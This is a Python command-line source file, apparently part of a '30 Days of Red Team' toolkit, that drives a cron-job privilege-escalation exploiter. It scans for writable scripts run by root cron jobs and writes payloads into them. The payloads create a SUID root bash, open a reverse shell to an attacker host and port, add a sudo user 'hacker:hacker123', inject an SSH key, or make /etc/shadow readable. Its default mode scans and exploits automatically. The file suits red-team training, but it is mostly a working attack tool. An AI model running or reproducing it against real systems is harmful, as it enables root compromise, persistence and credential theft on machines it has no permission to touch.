#!/usr/bin/env python3
"""
Cron Job Exploitation Framework - CLI
=====================================

Command-line interface for cron job privilege escalation.

Part of the 30 Days of Red Team toolkit.

Usage:
    python -m rt_cron_exploiter                    # Auto scan & exploit
    python -m rt_cron_exploiter --scan             # Scan only
    python -m rt_cron_exploiter --exploit /path    # Exploit specific script
    python -m rt_cron_exploiter --payloads         # List payloads
"""

import argparse
import sys
from pathlib import Path

from .core.exploiter import CronExploiter
from .core.cronjob import CronVulnerability, VulnerabilityType, CronJob, CronSchedule
from .payloads.payload_generator import PayloadType


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Cron Job Exploitation Framework - 30 Days of Red Team",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                              Auto-scan and exploit cron jobs
  %(prog)s --scan                       Scan only, no exploitation
  %(prog)s --exploit /path/to/script    Exploit specific writable script
  %(prog)s --payload reverse_shell --lhost 10.10.10.10 --lport 4444
  %(prog)s --payloads                   List available payloads

Payloads:
  suid_bash       Create SUID bash at /tmp/rootbash (default)
  reverse_shell   Connect back to attacker (requires --lhost/--lport)
  add_user        Create sudo user hacker:hacker123
  ssh_key         Inject SSH key (requires --ssh-key)
  chmod_shadow    Make /etc/shadow readable

⚠️  For authorized security testing only.
        """
    )

    # Mode selection
    mode = parser.add_mutually_exclusive_group()

    mode.add_argument(
        '--scan',
        action='store_true',
        help='Scan for cron jobs without exploiting'
    )

    mode.add_argument(
        '--exploit',
        type=str,
        metavar='PATH',
        help='Exploit a specific writable script'
    )

    mode.add_argument(
        '--payloads',
        action='store_true',
        help='List available payload types'
    )

    # Payload options
    parser.add_argument(
        '--payload',
        type=str,
        choices=['suid_bash', 'reverse_shell', 'add_user', 'ssh_key', 'chmod_shadow'],
        default='suid_bash',
        help='Payload type (default: suid_bash)'
    )

    parser.add_argument(
        '--lhost',
        type=str,
        help='Attacker IP for reverse shell'
    )

    parser.add_argument(
        '--lport',
        type=int,
        help='Attacker port for reverse shell'
    )

    parser.add_argument(
        '--ssh-key',
        type=str,
        help='SSH public key for ssh_key payload'
    )

    # Other options
    parser.add_argument(
        '-o', '--output',
        type=str,
        default='/tmp/cron_exploit',
        help='Output directory for reports (default: /tmp/cron_exploit)'
    )

    parser.add_argument(
        '--no-monitor',
        action='store_true',
        help='Do not monitor for execution after exploitation'
    )

    parser.add_argument(
        '--timeout',
        type=int,
        default=300,
        help='Monitoring timeout in seconds (default: 300)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )

    return parser.parse_args()


def main():
    """Main entry point"""
    args = parse_args()

    # Initialize exploiter
    exploiter = CronExploiter(
        output_dir=args.output,
        verbose=args.verbose
    )

    # List payloads mode
    if args.payloads:
        exploiter.list_payloads()
        return 0

    # Convert payload string to enum
    payload_map = {
        'suid_bash': PayloadType.SUID_BASH,
        'reverse_shell': PayloadType.REVERSE_SHELL,
        'add_user': PayloadType.ADD_USER,
        'ssh_key': PayloadType.SSH_KEY,
        'chmod_shadow': PayloadType.CHMOD_SHADOW
    }

    payload_type = payload_map.get(args.payload, PayloadType.SUID_BASH)

    # Validate reverse shell params
    if payload_type == PayloadType.REVERSE_SHELL:
        if not args.lhost or not args.lport:
            print("[-] Reverse shell requires --lhost and --lport")
            return 1

    # Exploit specific script mode
    if args.exploit:
        print(f"\n[*] Exploiting specific script: {args.exploit}")

        # Create a mock vulnerability for the specified path
        vuln = CronVulnerability(
            cron_job=CronJob(
                source="manual",
                user="root",
                command=args.exploit,
                schedule=CronSchedule("* * * * *")
            ),
            vuln_type=VulnerabilityType.WRITABLE_SCRIPT,
            target_path=args.exploit,
            description="Manually specified target",
            exploitation="Write payload to script"
        )

        result = exploiter.exploit(
            vulnerability=vuln,
            payload_type=payload_type,
            lhost=args.lhost,
            lport=args.lport,
            monitor=not args.no_monitor,
            timeout=args.timeout
        )

        if result.execution_confirmed:
            print(f"\n[+] SUCCESS!")
            return 0
        elif result.payload_written:
            print(f"\n[*] Payload written, waiting for cron execution...")
            return 0
        else:
            print(f"\n[-] Exploitation failed: {result.error}")
            return 1

    # Scan only mode
    if args.scan:
        result = exploiter.scan()
        exploiter.save_report(result)
        exploiter.generate_exploit_guide(result)

        if result.vulnerabilities:
            return 0
        return 1

    # Default: Full auto scan and exploit
    try:
        result = exploiter.scan_and_exploit(
            payload_type=payload_type,
            lhost=args.lhost,
            lport=args.lport,
            monitor=not args.no_monitor
        )

        exploiter.save_report(result)
        exploiter.generate_exploit_guide(result)

        if result.successful_exploits:
            print(f"\n[+] Exploitation successful!")
            return 0
        elif result.vulnerabilities:
            print(f"\n[*] Vulnerabilities found but not yet exploited.")
            print(f"[*] Check exploit_guide.txt for manual exploitation.")
            return 0
        else:
            print(f"\n[-] No exploitable cron jobs found.")
            return 1

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())